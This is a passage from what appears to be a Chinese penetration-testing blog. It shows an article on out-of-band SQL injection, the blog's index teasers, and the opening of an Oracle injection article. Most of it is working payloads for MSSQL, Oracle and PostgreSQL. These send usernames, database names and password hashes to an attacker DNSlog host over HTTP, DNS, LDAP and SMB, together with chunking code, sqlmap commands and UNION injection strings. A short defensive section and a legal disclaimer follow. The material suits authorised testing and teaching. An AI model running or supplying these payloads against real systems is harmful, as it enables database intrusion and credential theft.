+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- OLE HTTP</span></span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@o</span> <span class="type">INT</span>, <span class="variable">@u</span> <span class="type">VARCHAR</span>(<span class="number">200</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@u</span> <span class="operator">=</span> <span class="string">&#x27;http://your-id.ceye.io/&#x27;</span> <span class="operator">+</span> DB_NAME();</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;MSXML2.ServerXMLHTTP&#x27;</span>, <span class="variable">@o</span> <span class="keyword">OUT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@o</span>, <span class="string">&#x27;open&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="variable">@u</span>, <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@o</span>, <span class="string">&#x27;send&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sp_makewebtask（旧版本可用）</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_makewebtask <span class="variable">@outputfile</span><span class="operator">=</span><span class="string">&#x27;\\your-id.ceye.io\share\out.html&#x27;</span>,</span><br><span class="line">  <span class="variable">@query</span><span class="operator">=</span><span class="string">&#x27;SELECT * FROM users&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="三、Oracle"><a href="#三、Oracle" class="headerlink" title="三、Oracle"></a>三、Oracle</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- UTL_HTTP（HTTP外带）</span></span><br><span class="line"><span class="keyword">DECLARE</span> req UTL_HTTP.REQ; resp UTL_HTTP.RESP; url VARCHAR2(<span class="number">2000</span>);</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span> <span class="string">&#x27;http://your-id.ceye.io/&#x27;</span> <span class="operator">||</span></span><br><span class="line">    (<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>) <span class="keyword">INTO</span> url <span class="keyword">FROM</span> dual;</span><br><span class="line">  req :<span class="operator">=</span> UTL_HTTP.BEGIN_REQUEST(url);</span><br><span class="line">  resp :<span class="operator">=</span> UTL_HTTP.GET_RESPONSE(req);</span><br><span class="line">  UTL_HTTP.END_RESPONSE(resp);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- UTL_INADDR（DNS解析外带）</span></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(</span><br><span class="line">  (<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>) <span class="operator">||</span> <span class="string">&#x27;.your-id.ceye.io&#x27;</span></span><br><span class="line">) <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- HTTPURITYPE（最简洁HTTP外带）</span></span><br><span class="line"><span class="keyword">SELECT</span> HTTPURITYPE(</span><br><span class="line">  <span class="string">&#x27;http://your-id.ceye.io/&#x27;</span> <span class="operator">||</span> (<span class="keyword">SELECT</span> name <span class="keyword">FROM</span> v$database)</span><br><span class="line">).GETCLOB() <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- DBMS_LDAP</span></span><br><span class="line"><span class="keyword">DECLARE</span> s DBMS_LDAP.SESSION;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  s :<span class="operator">=</span> DBMS_LDAP.INIT(</span><br><span class="line">    (<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> sys.user$ <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>) <span class="operator">||</span> <span class="string">&#x27;.your-id.ceye.io&#x27;</span>, <span class="number">389</span></span><br><span class="line">  );</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="四、PostgreSQL"><a href="#四、PostgreSQL" class="headerlink" title="四、PostgreSQL"></a>四、PostgreSQL</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- COPY TO PROGRAM（需superuser）</span></span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> pg_shadow)</span><br><span class="line"><span class="keyword">TO</span> PROGRAM <span class="string">&#x27;curl --data-binary @- http://your-id.ceye.io/data&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- dblink扩展</span></span><br><span class="line"><span class="keyword">CREATE</span> EXTENSION dblink;</span><br><span class="line"><span class="keyword">SELECT</span> dblink_connect(</span><br><span class="line">  <span class="string">&#x27;host=&#x27;</span><span class="operator">||</span>current_database()<span class="operator">||</span><span class="string">&#x27;.your-id.ceye.io port=5432 dbname=postgres&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- plpythonu自定义函数</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> dns_exfil(data TEXT) <span class="keyword">RETURNS</span> VOID <span class="keyword">AS</span> $$</span><br><span class="line">  import socket; socket.gethostbyname(data <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io&#x27;</span>)</span><br><span class="line">$$ <span class="keyword">LANGUAGE</span> plpythonu;</span><br><span class="line"><span class="keyword">SELECT</span> dns_exfil((<span class="keyword">SELECT</span> passwd <span class="keyword">FROM</span> pg_shadow LIMIT <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="DNS隧道局限：63字符标签限制"><a href="#DNS隧道局限：63字符标签限制" class="headerlink" title="DNS隧道局限：63字符标签限制"></a>DNS隧道局限：63字符标签限制</h2><p>RFC 1035规定DNS标签不超过63字节，单次查询最多携带63有效字符。</p>
+<h3 id="应对策略"><a href="#应对策略" class="headerlink" title="应对策略"></a>应对策略</h3><p><strong>SUBSTRING分片</strong>（每轮63字符）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@i</span> <span class="type">INT</span> <span class="operator">=</span> <span class="number">1</span>, <span class="variable">@chunk</span> <span class="type">VARCHAR</span>(<span class="number">63</span>), <span class="variable">@cmd</span> <span class="type">VARCHAR</span>(<span class="number">200</span>);</span><br><span class="line">WHILE <span class="variable">@i</span> <span class="operator">&lt;=</span> LEN((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>))</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">SET</span> <span class="variable">@chunk</span> <span class="operator">=</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>), <span class="variable">@i</span>, <span class="number">63</span>);</span><br><span class="line">    <span class="keyword">SET</span> <span class="variable">@cmd</span> <span class="operator">=</span> <span class="string">&#x27;master..xp_dirtree &#x27;&#x27;\\&#x27;</span> <span class="operator">+</span> <span class="variable">@chunk</span></span><br><span class="line">             <span class="operator">+</span> <span class="string">&#x27;.idx-&#x27;</span> <span class="operator">+</span> <span class="built_in">CAST</span>(<span class="variable">@i</span> <span class="keyword">AS</span> <span class="type">VARCHAR</span>) <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">EXEC</span>(<span class="variable">@cmd</span>); <span class="keyword">SET</span> <span class="variable">@i</span> <span class="operator">=</span> <span class="variable">@i</span> <span class="operator">+</span> <span class="number">63</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>十六进制编码</strong>：用 <code>hex()</code> &#x2F; <code>CONVERT(VARBINARY)</code> 编码结果，避免空格和特殊字符破坏域名合法性。</p>
+<p><strong>多级标签</strong>：利用 <code>part1.part2.attacker.com</code> 结构一次携带更多信息（每级独立63上限）。</p>
+<hr>
+<h2 id="SQLMap实战：-dns-domain"><a href="#SQLMap实战：-dns-domain" class="headerlink" title="SQLMap实战：--dns-domain"></a>SQLMap实战：<code>--dns-domain</code></h2><p>SQLMap内置DNS外带，一条参数将盲注升级为DNS漏出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ceye.io</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> \</span><br><span class="line">  --dns-domain <span class="string">&quot;your-id.ceye.io&quot;</span> --technique=B --current-db</span><br><span class="line"></span><br><span class="line"><span class="comment"># Burp Collaborator + 高级参数</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> \</span><br><span class="line">  --dns-domain <span class="string">&quot;abc.burpcollaborator.net&quot;</span> --dbs --delay 2 --dns-port 5353</span><br></pre></td></tr></table></figure>
+
+<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><pre class="mermaid">flowchart TD
+    A[SQLMap注入DNS Payload] --> B[DB触发DNS查询]
+    B --> C[DNS递归到权威NS]
+    C --> D[SQLMap轮询API]
+    D --> E{新记录?}
+    E -->|是| F[解码域名获取数据]
+    E -->|否| D</pre>
+
+<h3 id="实战总流程"><a href="#实战总流程" class="headerlink" title="实战总流程"></a>实战总流程</h3><pre class="mermaid">flowchart TB
+    A[注册DNSLOG] --> B[发现注入点]
+    B --> C{DNS Payload触发?}
+    C -->|是| D[枚举库/表/列]
+    C -->|否| E[尝试SMB/HTTP信道]
+    D --> F[63字符分片拖字段]
+    F --> G[横向移动/收尾]</pre>
+
+<hr>
+<h2 id="常见坑点"><a href="#常见坑点" class="headerlink" title="常见坑点"></a>常见坑点</h2><p><strong>出站防火墙</strong>：数据库须能出站DNS&#x2F;HTTP&#x2F;SMB。企业内网策略、云安全组（AWS SG默认禁UDP 53出站）、容器NetworkPolicy均可阻断。</p>
+<p><strong>MySQL <code>secure_file_priv</code></strong>（5.7+）：<code>SHOW VARIABLES LIKE &#39;secure_file_priv&#39;</code> → <code>NULL</code> 则文件操作完全禁用；空串允许UNC外带。</p>
+<p><strong>特殊字符</strong>：DNS域名仅允许 <code>[a-zA-Z0-9\-]</code>，空格&#x2F;<code>@</code>&#x2F;<code>#</code> 须hex编码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> master..xp_dirtree <span class="string">&#x27;\\&#x27;</span> <span class="operator">+</span></span><br><span class="line">  <span class="keyword">CONVERT</span>(<span class="type">VARCHAR</span>(MAX), <span class="keyword">CONVERT</span>(<span class="type">VARBINARY</span>(MAX), @<span class="variable">@version</span>), <span class="number">2</span>)</span><br><span class="line">  <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>DNS缓存</strong>：域名拼接时间戳&#x2F;随机数确保唯一，防止缓存导致不发出查询。</p>
+<p><strong>SMB版本</strong>：Win10+&#x2F;Server2016+默认禁用SMBv1，MySQL UNC路径可能协商失败。</p>
+<hr>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="开发侧"><a href="#开发侧" class="headerlink" title="开发侧"></a>开发侧</h3><ul>
+<li><strong>参数化查询（Prepared Statement）</strong>：根治注入的唯一正解</li>
+<li><strong>最小权限</strong>：数据库账户不持有 <code>FILE</code>&#x2F;<code>SUPER</code>&#x2F;<code>sysadmin</code></li>
+<li><strong>禁用危险存储过程</strong>：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MSSQL</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_dropextendedproc <span class="string">&#x27;xp_cmdshell&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_dropextendedproc <span class="string">&#x27;xp_dirtree&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_dropextendedproc <span class="string">&#x27;xp_fileexist&#x27;</span>;</span><br><span class="line"><span class="comment">-- Oracle</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> UTL_HTTP <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> UTL_INADDR <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> DBMS_LDAP <span class="keyword">FROM</span> PUBLIC;</span><br></pre></td></tr></table></figure>
+
+<h3 id="运维侧"><a href="#运维侧" class="headerlink" title="运维侧"></a>运维侧</h3><ul>
+<li><strong>出站白名单</strong>：数据库仅在业务必需时允许出站，封禁非必要DNS&#x2F;HTTP&#x2F;SMB</li>
+<li><strong>DNS安全监控</strong>：IDS&#x2F;IPS对非授权域名查询告警，关注超长随机子域名特征</li>
+<li><strong>数据库审计日志</strong>：记录所有存储过程调用与异常网络访问</li>
+<li><strong>SIEM规则参考</strong>：<code>dns.query.length &gt; 40 AND NOT IN known_domains | stats count by src_ip | where count &gt; 10</code></li>
+</ul>
+<hr>
+<h2 id="技术对比"><a href="#技术对比" class="headerlink" title="技术对比"></a>技术对比</h2><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Union</th>
+<th>布尔盲注</th>
+<th>时间盲注</th>
+<th><strong>OOB外带</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>速度</td>
+<td>秒级</td>
+<td>分钟级</td>
+<td>小时级</td>
+<td>分钟级</td>
+</tr>
+<tr>
+<td>依赖条件</td>
+<td>页面回显</td>
+<td>二态差异</td>
+<td>无</td>
+<td>数据库可出站</td>
+</tr>
+<tr>
+<td>隐蔽性</td>
+<td>低</td>
+<td>中</td>
+<td>中</td>
+<td>高</td>
+</tr>
+<tr>
+<td>绕过WAF</td>
+<td>困难</td>
+<td>较易</td>
+<td>较易</td>
+<td>容易（载荷在网络层触发）</td>
+</tr>
+</tbody></table>
+<p>OOB外带价值不在于提速，更在于<strong>将不可能变为可能</strong>——当目标无回显、无状态差异且时间盲注耗时过长时，只要数据库能出网，数据就能外传。</p>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
+<p>本文所述技术仅供安全研究与授权渗透测试使用。未经系统所有者明确书面授权，对任何计算机系统实施本文所描述的攻击行为均属违法，可能触犯《中华人民共和国网络安全法》《刑法》第285条&#x2F;第286条等相关法律。作者不对任何滥用本文技术造成的法律后果承担责任。学习安全技术是为了更好地防御，而非攻击。请在合法实验环境（DVWA、SQLi-Labs、PentesterLab等）中实践，绝不触碰未授权目标。</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-token/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Windows-privesc-token/" class="post-title-link" itemprop="url">Windows提权：令牌窃取与模拟</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-01-01T08:00:00+08:00">2025-01-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Windows 令牌窃取与模拟提权全流程。深入分析 SeImpersonatePrivilege / SeAssignPrimaryToken / SeDebugPrivilege，详解 Potato 家族（PrintSpoofer、RoguePotato、EfsPotato、JuicyPotato）、命名管道模拟、LSASS 令牌窃取、Meterpreter getsystem 内部机制。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Windows-privesc-token/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/VulnHub-DC7-DC8-Pentest-Report/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/VulnHub-DC7-DC8-Pentest-Report/" class="post-title-link" itemprop="url">VulnHub DC7 & DC8 靶机笔记 — Drupal 漏洞链实战</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-12-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-12-15T08:00:00+08:00">2024-12-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-05-18 08:00:00" itemprop="dateModified" datetime="2026-05-18T08:00:00+08:00">2026-05-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>独立完成 VulnHub DC7 和 DC8 两台靶机的完整渗透测试，涵盖信息收集、漏洞利用、Getshell、权限提升全流程。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/VulnHub-DC7-DC8-Pentest-Report/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-oracle/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/SQL-injection-oracle/" class="post-title-link" itemprop="url">SQL注入：Oracle注入实战</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-12-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-12-15T08:00:00+08:00">2024-12-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Oracle 在企业级应用中地位重要。其 SQL 注入手法与 MySQL &#x2F; MSSQL 存在本质差异 — 语法更严格、内置包更多、攻击面更广。本文系统梳理 Oracle 注入技术，每项均给出可复现的实战示例。</p>
+<h2 id="Oracle-注入核心差异"><a href="#Oracle-注入核心差异" class="headerlink" title="Oracle 注入核心差异"></a>Oracle 注入核心差异</h2><h3 id="强制-FROM-子句与-DUAL-表"><a href="#强制-FROM-子句与-DUAL-表" class="headerlink" title="强制 FROM 子句与 DUAL 表"></a>强制 FROM 子句与 DUAL 表</h3><p>Oracle SELECT 必须带 FROM，无表时使用内置单行单列的 <code>DUAL</code>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;hello&#x27;</span>;           <span class="comment">-- Oracle 报错 ORA-00923</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;hello&#x27;</span> <span class="keyword">FROM</span> DUAL; <span class="comment">-- 正确写法</span></span><br></pre></td></tr></table></figure>
+
+<p>任何原本 <code>SELECT expression</code> 的位置都必须追加 <code>FROM DUAL</code>。</p>
+<h3 id="数据类型强制检查"><a href="#数据类型强制检查" class="headerlink" title="数据类型强制检查"></a>数据类型强制检查</h3><p>UNION 每列必须类型兼容，否则 <code>ORA-01790</code>。用 NULL 作为类型无关的占位符。</p>
+<h3 id="无-LIMIT-TOP"><a href="#无-LIMIT-TOP" class="headerlink" title="无 LIMIT &#x2F; TOP"></a>无 LIMIT &#x2F; TOP</h3><p>使用 <code>ROWNUM</code> 或 <code>FETCH FIRST</code>（12c+）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> ROWNUM <span class="operator">&lt;=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="内置包扩展攻击面"><a href="#内置包扩展攻击面" class="headerlink" title="内置包扩展攻击面"></a>内置包扩展攻击面</h3><p><code>UTL_HTTP</code>、<code>DBMS_PIPE</code>、<code>CTXSYS.DRITHSX</code>、<code>DBMS_XMLQUERY</code> 等 PL&#x2F;SQL 包为注入提供了出网、盲注甚至命令执行能力。</p>
+<h2 id="UNION-注入"><a href="#UNION-注入" class="headerlink" title="UNION 注入"></a>UNION 注入</h2><p>先用 NULL 递增确定列数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span> <span class="keyword">FROM</span> DUAL<span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT NULL,NULL,NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure>
+
+<p>提取核心信息：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库名、版本、当前用户</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT NULL,(SELECT SYS.DATABASE_NAME FROM DUAL) FROM DUAL--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,(<span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>) <span class="keyword">FROM</span> DUAL<span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT NULL,(SELECT USER FROM DUAL) FROM DUAL--</span></span><br></pre></td></tr></table></figure>
+
+<p>枚举表名（Oracle 用 <code>ALL_TABLES</code> 而非 <code>information_schema</code>）：</p>
